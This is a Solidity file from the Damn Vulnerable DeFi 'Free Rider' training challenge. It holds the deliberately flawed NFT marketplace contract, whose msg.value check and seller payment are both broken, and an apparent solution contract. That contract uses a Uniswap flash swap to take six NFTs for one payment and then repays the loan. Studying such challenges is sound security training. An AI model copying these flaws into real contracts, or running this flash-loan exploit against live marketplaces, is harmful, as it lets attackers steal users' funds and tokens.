// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {

    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public amountOfOffers;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);
    
    constructor(uint8 amountToMint) payable {
        require(amountToMint < 256, "Cannot mint that many tokens");
        token = new DamnValuableNFT();

        for(uint8 i = 0; i < amountToMint; i++) {
            token.safeMint(msg.sender);
        }        
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant {
        require(tokenIds.length > 0 && tokenIds.length == prices.length);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _offerOne(tokenIds[i], prices[i]);
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        require(price > 0, "Price must be greater than zero");

        require(
            msg.sender == token.ownerOf(tokenId),
            "Account offering must be the owner"
        );

        require(
            token.getApproved(tokenId) == address(this) ||
            token.isApprovedForAll(msg.sender, address(this)),
            "Account offering must have approved transfer"
        );

        offers[tokenId] = price;

        amountOfOffers++;

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _buyOne(tokenIds[i]);
        }
    }

    function _buyOne(uint256 tokenId) private {       
        uint256 priceToPay = offers[tokenId];
        require(priceToPay > 0, "Token is not being offered");

        require(msg.value >= priceToPay, "Amount paid is not enough");

        amountOfOffers--;

        // transfer from seller to buyer
        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller
        payable(token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }    

    receive() external payable {}
}


import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
interface IWETH9 {
    function balanceOf(address) external returns (uint);
    function deposit() external payable;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external returns (bool);
}

import "hardhat/console.sol";

contract FreeRiderAttack {
    IUniswapV2Pair public pair;
    address public weth;
    address attacker;
    DamnValuableNFT token;
    FreeRiderNFTMarketplace market;
    address public buyer;

    constructor(IUniswapV2Pair _pair,
     address _weth,
     DamnValuableNFT _token,
     FreeRiderNFTMarketplace _market,
     address _buyer){
         pair = _pair;
         weth = _weth;
         attacker = msg.sender;
         token = _token;
         market = _market;
         buyer = _buyer;
     }


    function uniswapV2Call( address to, uint amount0, uint amount1, bytes memory data) public{
        console.log("ETH bal b4: ",address(this).balance);
        console.log("WETH bal b4: ",IWETH9(weth).balanceOf(address(this)));

        IWETH9(weth).withdraw(amount0);

        console.log("ETH bal after: ",address(this).balance);
        console.log("WETH bal after: ",IWETH9(weth).balanceOf(address(this)));

        //Now we have got the ether, execute the buyMany option as in buyOne the rsecond require is faulty. 
        //It only check msg.senders balance
        uint256[] memory a = new uint256[](6);      
        for(uint i =0 ;i <6; i++){
            a[i]=i;
        }
        
        market.buyMany{value: 15 ether}(a);
        console.log("NFTs taken");
        console.log("ETH bal: ",address(this).balance);
        console.log("WETH bal: ",IWETH9(weth).balanceOf(address(this)));

        //Transfer NFT to buyer
        token.setApprovalForAll(buyer, true);
        for(uint i = 0; i<6; i++){
            token.safeTransferFrom(address(this), buyer, i);
        }
        console.log("NFTs transferred");
        console.log("ETH bal: ",address(this).balance);
        console.log("WETH bal: ",IWETH9(weth).balanceOf(address(this)));


        //Now transfer back the ether to weth contract
        IWETH9(weth).deposit{value: address(this).balance}();
        console.log("ETH transferred back");
        console.log("ETH bal after tr: ",address(this).balance);
        console.log("WETH bal after tr: ",IWETH9(weth).balanceOf(address(this)));

        //Now transer WETH to Uni back
        IWETH9(weth).transfer(address(pair), IWETH9(weth).balanceOf(address(this)));
        console.log("WETH transfered to uni");
        console.log("ETH bal: ",address(this).balance);
        console.log("WETH bal: ",IWETH9(weth).balanceOf(address(this)));

    }

    function attack() public{
        pair.swap(16 ether, 0, address(this), bytes("JUST TO ACTIVATE DATA") );
    }
    

    receive() external payable {}


    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external returns (bytes4) {  
        return IERC721Receiver.onERC721Received.selector;
    }
}
